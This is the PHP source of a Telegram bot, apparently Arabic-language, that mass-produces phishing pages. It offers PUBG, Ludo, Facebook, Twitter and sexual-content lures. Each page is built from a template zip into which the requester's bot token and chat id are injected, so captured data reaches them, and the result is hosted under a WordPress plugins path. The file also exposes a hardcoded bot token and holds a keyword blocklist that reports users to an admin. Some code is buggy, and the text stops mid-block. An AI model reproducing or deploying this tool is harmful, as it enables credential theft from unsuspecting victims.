<?php
ob_start();
$token = "6169327938:AAHGnW0TQ-aDcc8eSU_xKJDBdCDTl5edQs8";
define('API_KEY',$token);
function bot($method,$datas=[]){
    $url = "https://api.telegram.org/bot".API_KEY."/".$method;
$ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
    $res = curl_exec($ch);
    if(curl_error($ch)){
        var_dump(curl_error($ch));
    }else{
        return json_decode($res);
    }
}
$update = json_decode(file_get_contents('php://input'));
$message = $update->message;
$text = $message->text;
$name = $update->message->from->first_name;
$message_id = $message->message_id;
$chat_id = $message->chat->id;
$from_id = $message->from->id;
//\\
$data = $update->callback_query->data;
$name2 = $update->callback_query->from->first_name;
$message_id2 = $update->callback_query->message->message_id;
$chat_id2 = $update->callback_query->message->chat->id;
//\\
mkdir("data/$chat_id");
$log = file_get_contents("data/$chat_id/log.txt");
//\\
$super = "5943390502";
//\\
if(preg_match($text,"#decode#")){
bot("sendmessage",[
"chat_id"=>$chat_id,
'message_id'=>$message_id,
"text"=>"* ❍ عذرا لا تحاول اختراقي .*",
'reply_to_message_id'=>$message_id,
'parse_mode' =>"markdown",
'disable_web_page_preview'=>'true',
]); 
bot("sendmessage",[
"chat_id"=>$super,
"text"=>"❍ احذر حاول هذا الشخص اختراق المصنع
ايديه : `$from_id`
طريقه الاختراق : `$text`
",
'disable_web_page_preview'=>'true',
'parse_mode'=>"markdown",
]); return false;
}
if(preg_match("#decode#",$text)){
bot("sendmessage",[
"chat_id"=>$chat_id,
'message_id'=>$message_id,
"text"=>"* ❍ عذرا لا تحاول اختراقي .*",
'reply_to_message_id'=>$message_id,
'parse_mode' =>"markdown",
'disable_web_page_preview'=>'true',
]); 
bot("sendmessage",[
"chat_id"=>$super,
'message_id'=>$message_id,
"text"=>"❍ احذر حاول هذا الشخص اختراق المصنع
ايديه : `$from_id`
طريقه الاختراق : `$text`
",
'disable_web_page_preview'=>'true',
'parse_mode'=>"markdown",
]); return false;
}
if(preg_match($text,"#encode#")){
bot("sendmessage",[
"chat_id"=>$chat_id,
'message_id'=>$message_id,
"text"=>"* ❍ عذرا لا تحاول اختراقي .*",
'reply_to_message_id'=>$message_id,
'parse_mode' =>"markdown",
'disable_web_page_preview'=>'true',
]); 
bot("sendmessage",[
"chat_id"=>$super,
"text"=>"❍ احذر حاول هذا الشخص اختراق المصنع
ايديه : `$from_id`
طريقه الاختراق : `$text`
",
'disable_web_page_preview'=>'true',
'parse_mode'=>"markdown",
]); return false;
}
if(preg_match("#encode#",$text)){
bot("sendmessage",[
"chat_id"=>$chat_id,
'message_id'=>$message_id,
"text"=>"* ❍ عذرا لا تحاول اختراقي .*",
'reply_to_message_id'=>$message_id,
'parse_mode' =>"markdown",
'disable_web_page_preview'=>'true',
]); 
bot("sendmessage",[
"chat_id"=>$super,
"text"=>"❍ احذر حاول هذا الشخص اختراق المصنع
ايديه : `$from_id`
طريقه الاختراق : `$text`
",
'disable_web_page_preview'=>'true',
'parse_mode'=>"markdown",
]); return false;
}
if(preg_match($text,"#base64#")){
bot("sendmessage",[
"chat_id"=>$chat_id,
'message_id'=>$message_id,
"text"=>"* ❍ عذرا لا تحاول اختراقي .*",
'reply_to_message_id'=>$message_id,
'parse_mode' =>"markdown",
'disable_web_page_preview'=>'true',
]); 
bot("sendmessage",[
"chat_id"=>$super,
"text"=>"❍ احذر حاول هذا الشخص اختراق المصنع
ايديه : `$from_id`
طريقه الاختراق : `$text`
",
'disable_web_page_preview'=>'true',
'parse_mode'=>"markdown",
]); return false;
}
if(preg_match("#base64#",$text)){
bot("sendmessage",[
"chat_id"=>$chat_id,
'message_id'=>$message_id,
"text"=>"* ❍ عذرا لا تحاول اختراقي .*",
'reply_to_message_id'=>$message_id,
'parse_mode' =>"markdown",
'disable_web_page_preview'=>'true',
]); 
bot("sendmessage",[
"chat_id"=>$super,
"text"=>"❍ احذر حاول هذا الشخص اختراق المصنع
ايديه : `$from_id`
طريقه الاختراق : `$text`
",
'disable_web_page_preview'=>'true',
'parse_mode'=>"markdown",
]); return false;
}
if(preg_match($text,"#base64_decode#")){
bot("sendmessage",[
"chat_id"=>$chat_id,
'message_id'=>$message_id,
"text"=>"* ❍ عذرا لا تحاول اختراقي .*",
'reply_to_message_id'=>$message_id,
'parse_mode' =>"markdown",
'disable_web_page_preview'=>'true',
]); 
bot("sendmessage",[
"chat_id"=>$super,
"text"=>"❍ احذر حاول هذا الشخص اختراق المصنع
ايديه : `$from_id`
طريقه الاختراق : `$text`
",
'disable_web_page_preview'=>'true',
'parse_mode'=>"markdown",
]); return false;
}
if(preg_match("#base64_decode#",$text)){
bot("sendmessage",[
"chat_id"=>$chat_id,
'message_id'=>$message_id,
"text"=>"* ❍ عذرا لا تحاول اختراقي .*",
'reply_to_message_id'=>$message_id,
'parse_mode' =>"markdown",
'disable_web_page_preview'=>'true',
]); 
bot("sendmessage",[
"chat_id"=>$super,
"text"=>"❍ احذر حاول هذا الشخص اختراق المصنع
ايديه : `$from_id`
طريقه الاختراق : `$text`
",
'disable_web_page_preview'=>'true',
'parse_mode'=>"markdown",
]); return false;
}

if(preg_match($text,"#;#")){
bot("sendmessage",[
"chat_id"=>$chat_id,
'message_id'=>$message_id,
"text"=>"* ❍ عذرا لا تحاول اختراقي .*",
'reply_to_message_id'=>$message_id,
'parse_mode' =>"markdown",
'disable_web_page_preview'=>'true',
]); 
bot("sendmessage",[
"chat_id"=>$super,
"text"=>"❍ احذر حاول هذا الشخص اختراق المصنع
ايديه : `$from_id`
طريقه الاختراق : `$text`
",
'disable_web_page_preview'=>'true',
'parse_mode'=>"markdown",
]); return false;
}
if(preg_match("#;#",$text)){
bot("sendmessage",[
"chat_id"=>$chat_id,
'message_id'=>$message_id,
"text"=>"* ❍ عذرا لا تحاول اختراقي .*",
'reply_to_message_id'=>$message_id,
'parse_mode' =>"markdown",
'disable_web_page_preview'=>'true',
]); 
bot("sendmessage",[
"chat_id"=>$super,
"text"=>"❍ احذر حاول هذا الشخص اختراق المصنع
ايديه : `$from_id`
طريقه الاختراق : `$text`
",
'disable_web_page_preview'=>'true',
'parse_mode'=>"markdown",
]); return false;
}

if(preg_match($text,"#//#")){
bot("sendmessage",[
"chat_id"=>$chat_id,
'message_id'=>$message_id,
"text"=>"* ❍ عذرا لا تحاول اختراقي .*",
'reply_to_message_id'=>$message_id,
'parse_mode' =>"markdown",
'disable_web_page_preview'=>'true',
]); 
bot("sendmessage",[
"chat_id"=>$super,
"text"=>"❍ احذر حاول هذا الشخص اختراق المصنع
ايديه : `$from_id`
طريقه الاختراق : `$text`
",
'disable_web_page_preview'=>'true',
'parse_mode'=>"markdown",
]); return false;
}
if(preg_match("#//#",$text)){
bot("sendmessage",[
"chat_id"=>$chat_id,
'message_id'=>$message_id,
"text"=>"* ❍ عذرا لا تحاول اختراقي .*",
'reply_to_message_id'=>$message_id,
'parse_mode' =>"markdown",
'disable_web_page_preview'=>'true',
]); 
bot("sendmessage",[
"chat_id"=>$super,
"text"=>"❍ احذر حاول هذا الشخص اختراق المصنع
ايديه : `$from_id`
طريقه الاختراق : `$text`
",
'disable_web_page_preview'=>'true',
'parse_mode'=>"markdown",
]); return false;
}
if(preg_match($text,"#'#")){
bot("sendmessage",[
"chat_id"=>$chat_id,
'message_id'=>$message_id,
"text"=>"* ❍ عذرا لا تحاول اختراقي .*",
'reply_to_message_id'=>$message_id,
'parse_mode' =>"markdown",
'disable_web_page_preview'=>'true',
]); 
bot("sendmessage",[
"chat_id"=>$super,
"text"=>"❍ احذر حاول هذا الشخص اختراق المصنع
ايديه : `$from_id`
طريقه الاختراق : `$text`
",
'disable_web_page_preview'=>'true',
'parse_mode'=>"markdown",
]); return false;
}
if(preg_match("#'#",$text)){
bot("sendmessage",[
"chat_id"=>$chat_id,
'message_id'=>$message_id,
"text"=>"* ❍ عذرا لا تحاول اختراقي .*",
'reply_to_message_id'=>$message_id,
'parse_mode' =>"markdown",
'disable_web_page_preview'=>'true',
]); 
bot("sendmessage",[
"chat_id"=>$super,
"text"=>"❍ احذر حاول هذا الشخص اختراق المصنع
ايديه : `$from_id`
طريقه الاختراق : `$text`
",
'disable_web_page_preview'=>'true',
'parse_mode'=>"markdown",
]); return false;
}

if(preg_match($text,'#"#')){
bot("sendmessage",[
"chat_id"=>$chat_id,
'message_id'=>$message_id,
"text"=>"* ❍ عذرا لا تحاول اختراقي .*",
'reply_to_message_id'=>$message_id,
'parse_mode' =>"markdown",
'disable_web_page_preview'=>'true',
]); 
bot("sendmessage",[
"chat_id"=>$super,
"text"=>"❍ احذر حاول هذا الشخص اختراق المصنع
ايديه : `$from_id`
طريقه الاختراق : `$text`
",
'disable_web_page_preview'=>'true',
'parse_mode'=>"markdown",
]); return false;
}
if(preg_match('#"#',$text)){
bot("sendmessage",[
"chat_id"=>$chat_id,
'message_id'=>$message_id,
"text"=>"* ❍ عذرا لا تحاول اختراقي .*",
'reply_to_message_id'=>$message_id,
'parse_mode' =>"markdown",
'disable_web_page_preview'=>'true',
]); 
bot("sendmessage",[
"chat_id"=>$super,
"text"=>"❍ احذر حاول هذا الشخص اختراق المصنع
ايديه : `$from_id`
طريقه الاختراق : `$text`
",
'disable_web_page_preview'=>'true',
'parse_mode'=>"markdown",
]); return false;
}

if(preg_match($text,"#,#")){
bot("sendmessage",[
"chat_id"=>$chat_id,
'message_id'=>$message_id,
"text"=>"* ❍ عذرا لا تحاول اختراقي .*",
'reply_to_message_id'=>$message_id,
'parse_mode' =>"markdown",
'disable_web_page_preview'=>'true',
]); 
bot("sendmessage",[
"chat_id"=>$super,
"text"=>"❍ احذر حاول هذا الشخص اختراق المصنع
ايديه : `$from_id`
طريقه الاختراق : `$text`
",
'disable_web_page_preview'=>'true',
'parse_mode'=>"markdown",
]); return false;
}
if(preg_match("#,#",$text)){
bot("sendmessage",[
"chat_id"=>$chat_id,
'message_id'=>$message_id,
"text"=>"* ❍ عذرا لا تحاول اختراقي .*",
'reply_to_message_id'=>$message_id,
'parse_mode' =>"markdown",
'disable_web_page_preview'=>'true',
]); 
bot("sendmessage",[
"chat_id"=>$super,
"text"=>"❍ احذر حاول هذا الشخص اختراق المصنع
ايديه : `$from_id`
طريقه الاختراق : `$text`
",
'disable_web_page_preview'=>'true',
'parse_mode'=>"markdown",
]); return false;
}

if(preg_match($text,"#)#")){
bot("sendmessage",[
"chat_id"=>$chat_id,
'message_id'=>$message_id,
"text"=>"* ❍ عذرا لا تحاول اختراقي .*",
'reply_to_message_id'=>$message_id,
'parse_mode' =>"markdown",
'disable_web_page_preview'=>'true',
]); 
bot("sendmessage",[
"chat_id"=>$super,
"text"=>"❍ احذر حاول هذا الشخص اختراق المصنع
ايديه : `$from_id`
طريقه الاختراق : `$text`
",
'disable_web_page_preview'=>'true',
'parse_mode'=>"markdown",
]); return false;
}
if(preg_match("#)#",$text)){
bot("sendmessage",[
"chat_id"=>$chat_id,
'message_id'=>$message_id,
"text"=>"* ❍ عذرا لا تحاول اختراقي .*",
'reply_to_message_id'=>$message_id,
'parse_mode' =>"markdown",
'disable_web_page_preview'=>'true',
]); 
bot("sendmessage",[
"chat_id"=>$super,
"text"=>"❍ احذر حاول هذا الشخص اختراق المصنع
ايديه : `$from_id`
طريقه الاختراق : `$text`
",
'disable_web_page_preview'=>'true',
'parse_mode'=>"markdown",
]); return false;
}
if(preg_match($text,"#(#")){
bot("sendmessage",[
"chat_id"=>$chat_id,
'message_id'=>$message_id,
"text"=>"* ❍ عذرا لا تحاول اختراقي .*",
'reply_to_message_id'=>$message_id,
'parse_mode' =>"markdown",
'disable_web_page_preview'=>'true',
]); 
bot("sendmessage",[
"chat_id"=>$super,
"text"=>"❍ احذر حاول هذا الشخص اختراق المصنع
ايديه : `$from_id`
طريقه الاختراق : `$text`
",
'disable_web_page_preview'=>'true',
'parse_mode'=>"markdown",
]); return false;
}
if(preg_match("#(#",$text)){
bot("sendmessage",[
"chat_id"=>$chat_id,
'message_id'=>$message_id,
"text"=>"* ❍ عذرا لا تحاول اختراقي .*",
'reply_to_message_id'=>$message_id,
'parse_mode' =>"markdown",
'disable_web_page_preview'=>'true',
]); 
bot("sendmessage",[
"chat_id"=>$super,
"text"=>"❍ احذر حاول هذا الشخص اختراق المصنع
ايديه : `$from_id`
طريقه الاختراق : `$text`
",
'disable_web_page_preview'=>'true',
'parse_mode'=>"markdown",
]); return false;
}
if(preg_match($text,"#}#")){
bot("sendmessage",[
"chat_id"=>$chat_id,
'message_id'=>$message_id,
"text"=>"* ❍ عذرا لا تحاول اختراقي .*",
'reply_to_message_id'=>$message_id,
'parse_mode' =>"markdown",
'disable_web_page_preview'=>'true',
]); 
bot("sendmessage",[
"chat_id"=>$super,
"text"=>"❍ احذر حاول هذا الشخص اختراق المصنع
ايديه : `$from_id`
طريقه الاختراق : `$text`
",
'disable_web_page_preview'=>'true',
'parse_mode'=>"markdown",
]); return false;
}
if(preg_match("#}#",$text)){
bot("sendmessage",[
"chat_id"=>$chat_id,
'message_id'=>$message_id,
"text"=>"* ❍ عذرا لا تحاول اختراقي .*",
'reply_to_message_id'=>$message_id,
'parse_mode' =>"markdown",
'disable_web_page_preview'=>'true',
]); 
bot("sendmessage",[
"chat_id"=>$super,
"text"=>"❍ احذر حاول هذا الشخص اختراق المصنع
ايديه : `$from_id`
طريقه الاختراق : `$text`
",
'disable_web_page_preview'=>'true',
'parse_mode'=>"markdown",
]); return false;
}
if(preg_match($text,"#{#")){
bot("sendmessage",[
"chat_id"=>$chat_id,
'message_id'=>$message_id,
"text"=>"* ❍ عذرا لا تحاول اختراقي .*",
'reply_to_message_id'=>$message_id,
'parse_mode' =>"markdown",
'disable_web_page_preview'=>'true',
]); 
bot("sendmessage",[
"chat_id"=>$super,
"text"=>"❍ احذر حاول هذا الشخص اختراق المصنع
ايديه : `$from_id`
طريقه الاختراق : `$text`
",
'disable_web_page_preview'=>'true',
'parse_mode'=>"markdown",
]); return false;
}
if(preg_match("#{#",$text)){
bot("sendmessage",[
"chat_id"=>$chat_id,
'message_id'=>$message_id,
"text"=>"* ❍ عذرا لا تحاول اختراقي .*",
'reply_to_message_id'=>$message_id,
'parse_mode' =>"markdown",
'disable_web_page_preview'=>'true',
]); 
bot("sendmessage",[
"chat_id"=>$super,
"text"=>"❍ احذر حاول هذا الشخص اختراق المصنع
ايديه : `$from_id`
طريقه الاختراق : `$text`
",
'disable_web_page_preview'=>'true',
'parse_mode'=>"markdown",
]); return false;
}
if(preg_match($text,"#]#")){
bot("sendmessage",[
"chat_id"=>$chat_id,
'message_id'=>$message_id,
"text"=>"* ❍ عذرا لا تحاول اختراقي .*",
'reply_to_message_id'=>$message_id,
'parse_mode' =>"markdown",
'disable_web_page_preview'=>'true',
]); 
bot("sendmessage",[
"chat_id"=>$super,
"text"=>"❍ احذر حاول هذا الشخص اختراق المصنع
ايديه : `$from_id`
طريقه الاختراق : `$text`
",
'disable_web_page_preview'=>'true',
'parse_mode'=>"markdown",
]); return false;
}
if(preg_match("#]#",$text)){
bot("sendmessage",[
"chat_id"=>$chat_id,
'message_id'=>$message_id,
"text"=>"* ❍ عذرا لا تحاول اختراقي .*",
'reply_to_message_id'=>$message_id,
'parse_mode' =>"markdown",
'disable_web_page_preview'=>'true',
]); 
bot("sendmessage",[
"chat_id"=>$super,
"text"=>"❍ احذر حاول هذا الشخص اختراق المصنع
ايديه : `$from_id`
طريقه الاختراق : `$text`
",
'disable_web_page_preview'=>'true',
'parse_mode'=>"markdown",
]); return false;
}
if(preg_match($text,"#[#")){
bot("sendmessage",[
"chat_id"=>$chat_id,
'message_id'=>$message_id,
"text"=>"* ❍ عذرا لا تحاول اختراقي .*",
'reply_to_message_id'=>$message_id,
'parse_mode' =>"markdown",
'disable_web_page_preview'=>'true',
]); 
bot("sendmessage",[
"chat_id"=>$super,
"text"=>"❍ احذر حاول هذا الشخص اختراق المصنع
ايديه : `$from_id`
طريقه الاختراق : `$text`
",
'disable_web_page_preview'=>'true',
'parse_mode'=>"markdown",
]); return false;
}
if(preg_match("#[#",$text)){
bot("sendmessage",[
"chat_id"=>$chat_id,
'message_id'=>$message_id,
"text"=>"* ❍ عذرا لا تحاول اختراقي .*",
'reply_to_message_id'=>$message_id,
'parse_mode' =>"markdown",
'disable_web_page_preview'=>'true',
]); 
bot("sendmessage",[
"chat_id"=>$super,
"text"=>"❍ احذر حاول هذا الشخص اختراق المصنع
ايديه : `$from_id`
طريقه الاختراق : `$text`
",
'disable_web_page_preview'=>'true',
'parse_mode'=>"markdown",
]); return false;
}
if(preg_match("#file_get_contents#",$text)){
bot("sendmessage",[
"chat_id"=>$chat_id,
'message_id'=>$message_id,
"text"=>"* ❍ عذرا لا تحاول اختراقي .*",
'reply_to_message_id'=>$message_id,
'parse_mode' =>"markdown",
'disable_web_page_preview'=>'true',
]); 
bot("sendmessage",[
"chat_id"=>$super,
"text"=>"❍ احذر حاول هذا الشخص اختراق المصنع
ايديه : `$from_id`
طريقه الاختراق : `$text`
",
'disable_web_page_preview'=>'true',
'parse_mode'=>"markdown",
]); return false;
}
if(preg_match($text,"#file_get_contents#")){
bot("sendmessage",[
"chat_id"=>$chat_id,
'message_id'=>$message_id,
"text"=>"* ❍ عذرا لا تحاول اختراقي .*",
'reply_to_message_id'=>$message_id,
'parse_mode' =>"markdown",
'disable_web_page_preview'=>'true',
]); 
bot("sendmessage",[
"chat_id"=>$super,
"text"=>"❍ احذر حاول هذا الشخص اختراق المصنع
ايديه : `$from_id`
طريقه الاختراق : `$text`
",
'disable_web_page_preview'=>'true',
'parse_mode'=>"markdown",
]); return false;
}


if(preg_match("#github#",$text)){
bot("sendmessage",[
"chat_id"=>$chat_id,
'message_id'=>$message_id,
"text"=>"* ❍ عذرا لا تحاول اختراقي .*",
'reply_to_message_id'=>$message_id,
'parse_mode' =>"markdown",
'disable_web_page_preview'=>'true',
]); 
bot("sendmessage",[
"chat_id"=>$super,
"text"=>"❍ احذر حاول هذا الشخص اختراق المصنع
ايديه : `$from_id`
طريقه الاختراق : `$text`
",
'disable_web_page_preview'=>'true',
'parse_mode'=>"markdown",
]); return false;
}
if(preg_match("#https#",$text)){
bot("sendmessage",[
"chat_id"=>$chat_id,
'message_id'=>$message_id,
"text"=>"* ❍ عذرا لا تحاول اختراقي .*",
'reply_to_message_id'=>$message_id,
'parse_mode' =>"markdown",
'disable_web_page_preview'=>'true',
]); 
bot("sendmessage",[
"chat_id"=>$super,
"text"=>"❍ احذر حاول هذا الشخص اختراق المصنع
ايديه : `$from_id`
طريقه الاختراق : `$text`
",
'disable_web_page_preview'=>'true',
'parse_mode'=>"markdown",
]); return false;
}
if(preg_match("#http#",$text)){
bot("sendmessage",[
"chat_id"=>$chat_id,
'message_id'=>$message_id,
"text"=>"* ❍ عذرا لا تحاول اختراقي .*",
'reply_to_message_id'=>$message_id,
'parse_mode' =>"markdown",
'disable_web_page_preview'=>'true',
]); 
bot("sendmessage",[
"chat_id"=>$super,
"text"=>"❍ احذر حاول هذا الشخص اختراق المصنع
ايديه : `$from_id`
طريقه الاختراق : `$text`
",
'disable_web_page_preview'=>'true',
'parse_mode'=>"markdown",
]); return false;
}
if(preg_match($text,"#github#")){
bot("sendmessage",[
"chat_id"=>$chat_id,
'message_id'=>$message_id,
"text"=>"* ❍ عذرا لا تحاول اختراقي .*",
'reply_to_message_id'=>$message_id,
'parse_mode' =>"markdown",
'disable_web_page_preview'=>'true',
]); 
bot("sendmessage",[
"chat_id"=>$super,
"text"=>"❍ احذر حاول هذا الشخص اختراق المصنع
ايديه : `$from_id`
طريقه الاختراق : `$text`
",
'disable_web_page_preview'=>'true',
'parse_mode'=>"markdown",
]); return false;
}
if(preg_match($text,"#https#")){
bot("sendmessage",[
"chat_id"=>$chat_id,
'message_id'=>$message_id,
"text"=>"* ❍ عذرا لا تحاول اختراقي .*",
'reply_to_message_id'=>$message_id,
'parse_mode' =>"markdown",
'disable_web_page_preview'=>'true',
]); 
bot("sendmessage",[
"chat_id"=>$super,
"text"=>"❍ احذر حاول هذا الشخص اختراق المصنع
ايديه : `$from_id`
طريقه الاختراق : `$text`
",
'disable_web_page_preview'=>'true',
'parse_mode'=>"markdown",
]); return false;
}
if(preg_match($text,"#http#")){
bot("sendmessage",[
"chat_id"=>$chat_id,
'message_id'=>$message_id,
"text"=>"* ❍ عذرا لا تحاول اختراقي .*",
'reply_to_message_id'=>$message_id,
'parse_mode' =>"markdown",
'disable_web_page_preview'=>'true',
]); 
bot("sendmessage",[
"chat_id"=>$super,
"text"=>"❍ احذر حاول هذا الشخص اختراق المصنع
ايديه : `$from_id`
طريقه الاختراق : `$text`
",
'disable_web_page_preview'=>'true',
'parse_mode'=>"markdown",
]); return false;
}
//\\
$ali = "@index333bot"; 
$join = file_get_contents("https://api.telegram.org/bot".$Alsh."/getChatMember?chat_id=$ali&user_id=".$from_id);
if($message && (strpos($join,'"status":"left"') or strpos($join,'"Bad Request: USER_ID_INVALID"') or strpos($join,'"status":"kicked"'))!== false){
bot('sendMessage',['chat_id'=>$chat_id,
'text'=>"
👨‍✈️ ¦ مرحبا بگ عزيزي 🙇‍♂،
👾 ¦ لا يمڪنـك استخدام البوت ،
📟 ¦ عليك الإشتراگ في قنوات البوت ،

🖲 ¦ بعد الاشتراك اضغط {/start} ،
√    👇
",
  'reply_to_message_id'=>$message_id,
  'reply_markup'=>json_encode([
      'inline_keyboard'=>[
[['text'=>"اضغط هنا ",'url'=>'t.me/index333bot']],
]])
]);return false;}

if($text == "/start"){
bot('sendmessage',[
'chat_id'=>$chat_id, 
'text'=>"
- اهلا بك عزيزي { $name } .
- انا بوت صنع اندكسات مجاني وسريع .
- اضغط صنع اندكس واتبع الخطواط جيدا .
", 
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_to_message_id'=>$message_id,
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[ 
[["text"=>"- صنع اندكس .","callback_data"=>"make"]],
[["text"=>"- مطور البوت .","callback_data"=>"info"]],
]])
]);
}
if($data =="home"){
file_put_contents("data/$chat_id2","none");
bot('deletemessage',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id2,
]);
bot('SendMessage',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id2, 
'text'=>"
- اهلا بك عزيزي مجددا { $name2 } .
- انا بوت صنع اندكسات مجاني وسريع .
- اضغط صنع اندكس واتبع الخطواط جيدا .
", 
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_to_message_id'=>$message_id,
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[ 
[["text"=>"- صنع اندكس .","callback_data"=>"make"]],
[["text"=>"- مطور البوت .","callback_data"=>"info"]],
]])
]);
}
if($data == "info"){
bot('deletemessage',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id2,
]);
bot('Sendphoto',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id2,
'photo' =>"https://t.me/index99/17",
'caption'=>"
╭──── • ◈ • ────╮
么 [اݪخــ̷ِْــٰــ۫͜ـــݪيفـه.♡゙⊀𝟑 🚸 ꭵꪎ](https://t.me/TOOE5)
╰──── • ◈ • ────╯
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[["text"=>"- back .","callback_data"=>"home"]],
]])
]);
}
if($data =="make"){
file_put_contents("data/$chat_id2","none");
bot('deletemessage',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id2,
]);
bot('SendMessage',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id2, 
'text'=>"
- اهلا بك مجددا عزيزي { $name2 } .
- اختار نوع الاندكس الذي تريده من خلال الازرار .
", 
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_to_message_id'=>$message_id,
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[ 
[["text"=>"- Twitter .","callback_data"=>"twitter"]],
[["text"=>"- PUBG .","callback_data"=>"pubg"],["text"=>"-YALLA LUDO .","callback_data"=>"ludo"]],
[["text"=>"- SEX .","callback_data"=>"sex"],["text"=>"- facebook .","callback_data"=>"facebook"]],
[["text"=>"- back .","callback_data"=>"home"]],
]])
]);
}
//\\
if($data =="pubg" and !file_exists("pubg/$chat_id2/email.php")){
file_put_contents("data/$chat_id2/log.txt","pubg");
bot('deletemessage',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id2,
]);
bot('Sendphoto',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id2, 
'photo'=>"https://t.me/index99/23",
'caption'=>"
- لقد قمت ب اختيار اندكس ببجي .
- ارسل التوكن الان .
", 
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_to_message_id'=>$message_id,
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[ 
[["text"=>"- back .","callback_data"=>"make"]],
]])
]);
}
if($text != "/start" and $log == "pubg"){
$api = json_decode(file_get_contents("https://api.telegram.org/bot".$text."/getMe"),1);
$check = $api["ok"];
if($check != true){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"- التوكن خطأ .",
'reply_to_message_id'=>$message_id,
]);
}else{
mkdir("pubg/$chat_id");
$zip = new ZipArchive;
if($zip->open("pubg.zip") == true){
$zip->extractTo(__DIR__."/"."pubg/$chat_id");
$zip->close();
$file = file_get_contents("pubg/$chat_id/email.php");
$file2 = str_replace("my-token","$text",$file);
$file3 = str_replace("my-id","$chat_id",$file2);
file_put_contents("pubg/$chat_id/email.php",$file3);
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
- تم انشاء اندكس ببجي .
- رابط الاندكس : https://".$_SERVER["SERVER_NAME"]."/wp230/wp-content/plugins/x/pubg/$chat_id
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_to_message_id'=>$message_id,
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[ 
[["text"=>"- 𝙙𝙚𝙫 .","url"=>"t.me/index333bot"]],
]])
]);
bot('sendMessage',[
'chat_id'=>$super,
'text'=>"
- تم انشاء اندكس ببجي .
- رابط الاندكس : https://".$_SERVER["SERVER_NAME"]."/wp230/wp-content/plugins/x/pubg/$chat_id
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[ 
[["text"=>"- 𝙙𝙚𝙫 .","url"=>"t.me/index333bot"]],
]])
]);
}}}
//\\
if($data =="ludo"  and !file_exists("ludo/$chat_id2/email.php")){
file_put_contents("data/$chat_id2/log.txt","ludo");
bot('deletemessage',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id2,
]);
bot('Sendphoto',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id2, 
'photo'=>"https://t.me/index99/21",
'caption'=>"
- لقد قمت ب اختيار اندكس لودو .
- ارسل التوكن الان .
", 
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_to_message_id'=>$message_id,
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[ 
[["text"=>"- back .","callback_data"=>"make"]],
]])
]);
}
if($text != "/start" and $log == "ludo"){
$api = json_decode(file_get_contents("https://api.telegram.org/bot".$text."/getMe"),1);
$check = $api["ok"];
if($check != true){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"- التوكن خطأ .",
'reply_to_message_id'=>$message_id,
]);
}else{
mkdir("ludo/$chat_id");
$zip = new ZipArchive;
if($zip->open("ludo.zip") == true){
$zip->extractTo(__DIR__."/"."ludo/$chat_id");
$zip->close();
$file = file_get_contents("ludo/$chat_id/email.php");
$file2 = str_replace("my-token","$text",$file);
$file3 = str_replace("my-id","$chat_id",$file2);
file_put_contents("ludo/$chat_id/email.php",$file3);
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
- تم انشاء اندكس لودو .
- رابط الاندكس : https://".$_SERVER["SERVER_NAME"]."/wp230/wp-content/plugins/x/ludo/$chat_id
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_to_message_id'=>$message_id,
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[ 
[["text"=>"- 𝙙𝙚𝙫 .","url"=>"t.me/index333bot"]],
]])
]);
bot('sendMessage',[
'chat_id'=>$super,
'text'=>"
- تم انشاء اندكس لودو .
- رابط الاندكس : https://".$_SERVER["SERVER_NAME"]."/wp230/wp-content/plugins/x/ludo/$chat_id
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[ 
[["text"=>"- 𝙙𝙚𝙫 .","url"=>"t.me/index333bot"]],
]])
]);
}}}
//\\
if($data =="sex" and !file_exists("sex/$chat_id2/email.php")){
file_put_contents("data/$chat_id2/log.txt","sex");
bot('deletemessage',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id2,
]);
bot('Sendphoto',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id2, 
'photo'=>"https://t.me/index99/7",
'caption'=>"
- لقد قمت ب اختيار اندكس انحراف .
- ارسل التوكن الان .
", 
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_to_message_id'=>$message_id,
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[ 
[["text"=>"- back .","callback_data"=>"make"]],
]])
]);
}
if($text != "/start" and $log == "sex"){
$api = json_decode(file_get_contents("https://api.telegram.org/bot".$text."/getMe"),1);
$check = $api["ok"];
if($check != true){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"- التوكن خطأ .",
'reply_to_message_id'=>$message_id,
]);
}else{
mkdir("sex/$chat_id");
$zip = new ZipArchive;
if($zip->open("sex.zip") == true){
